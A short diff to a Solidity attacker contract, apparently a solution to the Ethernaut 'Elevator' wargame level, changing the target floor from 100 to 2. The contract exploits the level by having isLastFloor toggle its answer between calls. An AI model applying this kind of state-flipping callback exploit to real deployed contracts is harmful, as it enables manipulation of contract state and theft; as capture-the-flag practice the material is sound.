@@ -11,7 +11,7 @@ contract ElevatorAttack is Building {
     }
 
     function isLastFloor(uint256 _last) external returns (bool) {
-        if (_last == 100) {
+        if (_last == 2) {
             tick = !tick;
         }
 
@@ -21,6 +21,6 @@ contract ElevatorAttack is Building {
     function attack(address _instance) public {
         Elevator ev = Elevator(_instance);
 
-        ev.goTo(100);
+        ev.goTo(2);
     }
 }
